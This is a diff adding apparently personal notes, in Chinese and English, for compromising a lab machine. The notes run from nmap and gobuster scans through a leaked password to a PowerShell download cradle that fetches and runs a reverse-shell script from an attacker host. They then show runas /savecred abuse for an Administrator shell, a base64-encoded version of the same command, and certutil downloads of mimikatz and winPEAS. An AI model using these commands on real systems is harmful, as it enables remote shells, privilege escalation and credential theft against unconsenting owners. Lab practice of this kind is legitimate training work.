@@ -1,0 +1,44 @@
+nmap 10.129.155.194 -sV -sC -Pn > nmap.txt
+
+gobuster dir  -u http://10.129.155.194/ -w /usr/share/dirb/wordlists/common.txt -x txt,php,cgi > gobuster.txt
+gobuster dir  -u http://10.129.155.194/aspnet_client -w /usr/share/dirb/wordlists/common.txt -x txt,php,cgi > gobusteaspnetr.txt
+gobuster dir  -u http://10.129.155.194/aspnet_client/system_web/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x txt,php,cgi > gobusteaspsys.txt
+
+
+
+The password for the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.
+
+
+1.nmap掃描出21 23 80 端口
+2.ftp登入可取得2個檔案
+3.mdb-sql查看到密碼
+4.使用密碼解壓縮檔案,找到帳密密碼
+5.telnet連接後,使用powershell取得互動式shell
+powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.8/Invoke-PowerShellTcp9000.ps1')
+6.使用JAWS查看漏洞
+IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.8/JAWS.ps1')
+7.查找到ZKAceess的lnk檔案
+C:\users\public\desktop\ZKAccess3.5 Security System.lnk
+8.type查看是亂碼,嘗試使用powershell查看Shortcut(查看windows超連結)
+PS C:\users\public\desktop> $WScript=New-object -ComObject Wscript.Shell
+PS C:\users\public\desktop> $shortcut = Get-ChildItem *.lnk
+PS C:\users\public\desktop> $shortcut
+PS C:\users\public\desktop> $Wscript.CreateShortcut($shortcut)
+8.使用administrator用戶執行指令,驗證ping可以成功執行
+C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "ping 10.10.14.8"
+9.替換指令,可以成功取的root的reverse shell
+C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.8/Invoke-PowerShellTcp.ps1')"
+10.可能有特殊符號無法被正常執行的情況下,可將命令加密
+echo -n "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.8/Invoke-PowerShellTcp9000.ps1')" | iconv --to-code UTF-16LE |base64 -w 0
+11.執行加密指令,取得reverse shell
+C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AOAAvAEkAbgB2AG8AawBlAC0AUABvAHcAZQByAFMAaABlAGwAbABUAGMAcAA5ADAAMAAwAC4AcABzADEAJwApAA=="
+
+
+
+
+
+Invoke-Allchecks
+certutil.exe -urlcache -split -f http://10.10.14.8/winPEAS.exe winPEAS.exe
+certutil.exe -urlcache -split -f http://10.10.14.8/mimikatz_trunk.exe mimikatz_trunk.exe
+IEX(New-Object Net.Webclient).downloadstring('http://10.10.14.26:8000/Sherlock.ps1')
+(New-Object Net.Webclient).downloadFile('http://10.10.14.8/mimikatz.exe', 'mimikatz.exe')
